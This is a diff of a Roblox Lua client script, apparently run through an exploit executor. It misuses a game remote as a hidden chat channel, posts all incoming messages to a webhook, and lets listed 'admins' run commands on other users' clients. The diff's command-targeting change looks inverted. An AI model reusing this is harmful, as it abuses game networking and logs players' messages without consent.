+    TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
+        Position = UDim2.new(1, -270, 0.8, 0)
+    }):Play()
 
-	task.wait(0.5)
-	RepositionNotifications()
+    task.wait(0.5)
+    RepositionNotifications()
 
-	task.delay(5, function()
-		local tween = TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
-			Position = UDim2.new(1, 20, notif.Position.Y.Scale, 0)
-		})
-		tween:Play()
-		tween.Completed:Wait()
+    task.delay(5, function()
+        local tween = TweenService:Create(notif, TweenInfo.new(0.5, Enum.EasingStyle.Quart), {
+            Position = UDim2.new(1, 20, notif.Position.Y.Scale, 0)
+        })
+        tween:Play()
+        tween.Completed:Wait()
 
-		for i, n in ipairs(activeNotifications) do
-			if n == notif then
-				table.remove(activeNotifications, i)
-				break
-			end
-		end
+        for i, n in ipairs(activeNotifications) do
+            if n == notif then
+                table.remove(activeNotifications, i)
+                break
+            end
+        end
 
-		notif:Destroy()
-		RepositionNotifications()
-	end)
+        notif:Destroy()
+        RepositionNotifications()
+    end)
 end
 
 local function SendMessage()
-	local text = InputBox.Text
-	if not text or not text:match("%S") then return end
+    local text = InputBox.Text
+    if not text or not text:match("%S") then return end
 
-	if editingLabel and editingOriginalText then
-		local newMsg = LocalPlayer.DisplayName .. ": " .. text
-		if newMsg == editingOriginalText then
-			CancelEdit()
-			return
-		end
-		ExtendGrabLine:FireServer(editingOriginalText .. "||EDITED||" .. newMsg .. " //edit")
-		CancelEdit()
-	else
-		ExtendGrabLine:FireServer(text .. " //chat")
-	end
+    if editingLabel and editingOriginalText then
+        local newMsg = LocalPlayer.DisplayName .. ": " .. text
+        if newMsg == editingOriginalText then
+            CancelEdit()
+            return
+        end
+        ExtendGrabLine:FireServer(editingOriginalText .. "||EDITED||" .. newMsg .. " //edit")
+        CancelEdit()
+    else
+        ExtendGrabLine:FireServer(text .. " //chat")
+    end
 
-	InputBox.Text = ""
+    InputBox.Text = ""
 end
 
 local function HandleEdit(oldText, newText, senderName)
-	if oldText == newText then return end
-	local label = FindLabelByText(oldText)
-	if label then
-		label.Text = newText
-		label:SetAttribute("OriginalText", newText)
-		MarkAsEdited(label)
-	end
-	for i, msg in ipairs(chatHistory) do
-		if msg == oldText then
-			chatHistory[i] = newText
-			break
-		end
-	end
-	ShowNotification("Message Edited", senderName .. " edited a message")
+    if oldText == newText then return end
+    local label = FindLabelByText(oldText)
+    if label then
+        label.Text = newText
+        label:SetAttribute("OriginalText", newText)
+        MarkAsEdited(label)
+    end
+    for i, msg in ipairs(chatHistory) do
+        if msg == oldText then
+            chatHistory[i] = newText
+            break
+        end
+    end
+    ShowNotification("Message Edited", senderName .. " edited a message")
 end
 
 local function HandleReaction(msgId, emoji, reactorName)
-	if not messageReactions[msgId] then
-		messageReactions[msgId] = {}
-	end
-	if not messageReactions[msgId][emoji] then
-		messageReactions[msgId][emoji] = {}
-	end
+    if not messageReactions[msgId] then
+        messageReactions[msgId] = {}
+    end
+    if not messageReactions[msgId][emoji] then
+        messageReactions[msgId][emoji] = {}
+    end
 
-	if messageReactions[msgId][emoji][reactorName] then
-		messageReactions[msgId][emoji][reactorName] = nil
-		local count = 0
-		for _ in pairs(messageReactions[msgId][emoji]) do count = count + 1 end
-		if count == 0 then
-			messageReactions[msgId][emoji] = nil
-		end
-	else
-		messageReactions[msgId][emoji][reactorName] = true
-	end
+    if messageReactions[msgId][emoji][reactorName] then
+        messageReactions[msgId][emoji][reactorName] = nil
+        local count = 0
+        for _ in pairs(messageReactions[msgId][emoji]) do count = count + 1 end
+        if count == 0 then
+            messageReactions[msgId][emoji] = nil
+        end
+    else
+        messageReactions[msgId][emoji][reactorName] = true
+    end
 
-	local label = FindLabelByText(msgId)
-	if label then
-		UpdateReactionBar(label)
-	end
+    local label = FindLabelByText(msgId)
+    if label then
+        UpdateReactionBar(label)
+    end
 
-	if reactorName ~= LocalPlayer.DisplayName then
-		if messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][reactorName] then
-			ShowNotification("Reaction", reactorName .. " reacted " .. emoji)
-		else
-			ShowNotification("Reaction", reactorName .. " removed " .. emoji)
-		end
-	end
+    if reactorName ~= LocalPlayer.DisplayName then
+        if messageReactions[msgId] and messageReactions[msgId][emoji] and messageReactions[msgId][emoji][reactorName] then
+            ShowNotification("Reaction", reactorName .. " reacted " .. emoji)
+        else
+            ShowNotification("Reaction", reactorName .. " removed " .. emoji)
+        end
+    end
 end
 
 local function HandleIncomingMessage(message, sender)
-	if typeof(message) ~= "string" or message == "" then return end
+    if typeof(message) ~= "string" or message == "" then return end
 
-	local senderName = "Unknown"
-	if typeof(sender) == "Instance" and sender:IsA("Player") then
-		senderName = sender.DisplayName
-	elseif typeof(sender) == "string" then
-		senderName = sender
-	end
+    local senderName = "Unknown"
+    if typeof(sender) == "Instance" and sender:IsA("Player") then
+        senderName = sender.DisplayName
+    elseif typeof(sender) == "string" then
+        senderName = sender
+    end
 
-	if message:find(" //react") then
-		local cleanMessage = message:gsub(" //react$", "")
-		local msgText, emoji, reactorName = cleanMessage:match("^(.+)||REACT||(.+)||(.+)$")
-		if msgText and emoji and reactorName then
-			HandleReaction(msgText, emoji, reactorName)
-		end
-		return
-	end
+    if message:find(" //react") then
+        local cleanMessage = message:gsub(" //react$", "")
+        local msgText, emoji, reactorName = cleanMessage:match("^(.+)||REACT||(.+)||(.+)$")
+        if msgText and emoji and reactorName then
+            HandleReaction(msgText, emoji, reactorName)
+        end
+        return
+    end
 
-	if message:find(" //edit") then
-		local cleanMessage = message:gsub(" //edit$", "")
-		local oldText, newText = cleanMessage:match("^(.+)||EDITED||(.+)$")
-		if oldText and newText then
-			HandleEdit(oldText, newText, senderName)
-		end
-		return
-	end
+    if message:find(" //edit") then
+        local cleanMessage = message:gsub(" //edit$", "")
+        local oldText, newText = cleanMessage:match("^(.+)||EDITED||(.+)$")
+        if oldText and newText then
+            HandleEdit(oldText, newText, senderName)
+        end
+        return
+    end
 
-	local cleanMessage = message:gsub(" //chat$", "")
-	local logEntry = senderName .. ": " .. cleanMessage
-	AddMessage(logEntry, senderName)
+    local cleanMessage = message:gsub(" //chat$", "")
+    local logEntry = senderName .. ": " .. cleanMessage
+    AddMessage(logEntry, senderName)
 
-	if IsImageUrl(cleanMessage) then
-		ShowNotification("New Image", senderName .. " sent an image")
-	else
-		ShowNotification("New Message", logEntry)
-	end
+    if IsImageUrl(cleanMessage) then
+        ShowNotification("New Image", senderName .. " sent an image")
+    else
+        ShowNotification("New Message", logEntry)
+    end
 
-	if webhookEnabled and webhookUrl ~= "" then
-		pcall(function()
-			request({
-				Url = webhookUrl,
-				Method = "POST",
-				Headers = {["Content-Type"] = "application/json"},
-				Body = HttpService:JSONEncode({
-					content = string.format("**%s**: %s", senderName, cleanMessage),
-					username = "Chat Logger"
-				})
-			})
-		end)
-	end
+    if webhookEnabled and webhookUrl ~= "" then
+        pcall(function()
+            request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    content = string.format("**%s**: %s", senderName, cleanMessage),
+                    username = "Chat Logger"
+                })
+            })
+        end)
+    end
 end
 
 local function ProcessEvent(...)
-	local args = {...}
-	local sender = nil
-	local message = nil
+    local args = {...}
+    local sender = nil
+    local message = nil
 
-	if #args >= 2 and typeof(args[1]) == "Instance" and args[1]:IsA("Player") and typeof(args[2]) == "string" then
-		sender = args[1]
-		message = args[2]
-	elseif #args >= 1 and typeof(args[1]) == "string" then
-		message = args[1]
-		sender = LocalPlayer
-	end
+    if #args >= 2 and typeof(args[1]) == "Instance" and args[1]:IsA("Player") and typeof(args[2]) == "string" then
+        sender = args[1]
+        message = args[2]
+    elseif #args >= 1 and typeof(args[1]) == "string" then
+        message = args[1]
+        sender = LocalPlayer
+    end
 
-	local isCommand = false
+    if sender and message then
+        local senderName = sender.Name
+        local cleanMsg = message
 
-	if sender and message then
-		local senderName = sender.Name
-		local cleanMsg = message
+        if cleanMsg:sub(-7) == " //chat" then
+            cleanMsg = cleanMsg:sub(1, -8)
+        end
 
-		if cleanMsg:sub(-7) == " //chat" then
-			cleanMsg = cleanMsg:sub(1, -8)
-		end
-        
-		if isAdmin(senderName) and string.sub(cleanMsg, 1, #Prefix) == Prefix then
-			local Args = cleanMsg:split(" ")
-			local cmdWord1 = string.lower(Args[1] or "")
-			local commandName = cmdWord1:sub(#Prefix + 1)
+        if isAdmin(senderName) and string.sub(cleanMsg, 1, #Prefix) == Prefix then
+            local Args = cleanMsg:split(" ")
+            local cmdWord1 = string.lower(Args[1] or "")
+            local commandName = cmdWord1:sub(#Prefix + 1)
 
-			if canUseCommand(senderName, commandName) then
-				local targetInput = string.lower(Args[2] or "")
-				if targetInput ~= "" then
-					local targetPlayer = nil
+            if canUseCommand(senderName, commandName) then
+                local targetName = string.lower(Args[2] or "")
 
-					if targetInput == "all" then
-						isCommand = true
+                if string.lower(LocalPlayer.Name) ~= targetName and sender ~= LocalPlayer then
+                    ExecuteCommand(Args, sender)
+                end
+            end
+        end
+    end
 
-						if sender ~= LocalPlayer then
-							ExecuteCommand(Args, sender)
-						end
-					else
-						targetPlayer = FindPlayer(targetInput)
-
-						if targetPlayer then
-							isCommand = true
-							if targetPlayer == LocalPlayer and sender ~= LocalPlayer then
-								ExecuteCommand(Args, sender)
-							end
-						end
-					end
-				end
-			end
-		end
-	end
-    
-	if not isCommand and message and typeof(message) == "string" and
-		(message:find(" //chat") or message:find(" //edit") or message:find(" //react")) then
-		HandleIncomingMessage(message, sender)
-	end
+    if message and typeof(message) == "string" and 
+       (message:find(" //chat") or message:find(" //edit") or message:find(" //react")) then
+        HandleIncomingMessage(message, sender)
+    end
 end
 
 SendButton.MouseButton1Click:Connect(SendMessage)
 InputBox.FocusLost:Connect(function(enterPressed)
-	if enterPressed then
-		SendMessage()
-	end
+    if enterPressed then
+        SendMessage()
+    end
 end)
 
 EditCancelButton.MouseButton1Click:Connect(CancelEdit)
@@ -972,53 +942,53 @@ EditCancelButton.MouseButton1Click:Connect(CancelEdit)
 local periodPressed = false
 
 UserInputService.InputBegan:Connect(function(input)
-	if input.KeyCode == Enum.KeyCode.Period and not InputBox:IsFocused() then
-		periodPressed = true
-	end
+    if input.KeyCode == Enum.KeyCode.Period and not InputBox:IsFocused() then
+        periodPressed = true
+    end
 end)
 
 UserInputService.InputEnded:Connect(function(input)
-	if input.KeyCode == Enum.KeyCode.Period and periodPressed then
-		periodPressed = false
-		InputBox.Text = ""
-		InputBox:CaptureFocus()
-		task.defer(function()
-			InputBox.Text = ""
-		end)
-	end
+    if input.KeyCode == Enum.KeyCode.Period and periodPressed then
+        periodPressed = false
+        InputBox.Text = ""
+        InputBox:CaptureFocus()
+        task.defer(function()
+            InputBox.Text = ""
+        end)
+    end
 end)
 
 local savedPos = nil
 
 CloseButton.MouseButton1Click:Connect(function()
-	savedPos = MainFrame.Position
-	MainFrame.Visible = false
-	ToggleButton.Visible = true
+    savedPos = MainFrame.Position
+    MainFrame.Visible = false
+    ToggleButton.Visible = true
 end)
 
 ToggleButton.MouseButton1Click:Connect(function()
-	MainFrame.Visible = not MainFrame.Visible
-	if MainFrame.Visible then
-		if savedPos then
-			MainFrame.Position = savedPos
-		end
-		ToggleButton.Visible = false
-	end
+    MainFrame.Visible = not MainFrame.Visible
+    if MainFrame.Visible then
+        if savedPos then
+            MainFrame.Position = savedPos
+        end
+        ToggleButton.Visible = false
+    end
 end)
 
 if OnReceiveMessage then
-	OnReceiveMessage.OnClientEvent:Connect(ProcessEvent)
+    OnReceiveMessage.OnClientEvent:Connect(ProcessEvent)
 end
 
 if NetworkClient then
-	NetworkClient.OnClientEvent:Connect(ProcessEvent)
+    NetworkClient.OnClientEvent:Connect(ProcessEvent)
 end
 
 ExtendGrabLine.OnClientEvent:Connect(ProcessEvent)
 
 local ChatEvent = ReplicatedStorage:FindFirstChild("ChatEvent")
 if ChatEvent then
-	ChatEvent.OnClientEvent:Connect(ProcessEvent)
+    ChatEvent.OnClientEvent:Connect(ProcessEvent)
 end
 
-ToggleButton.Visible = false
+ToggleButton.Visible = false 
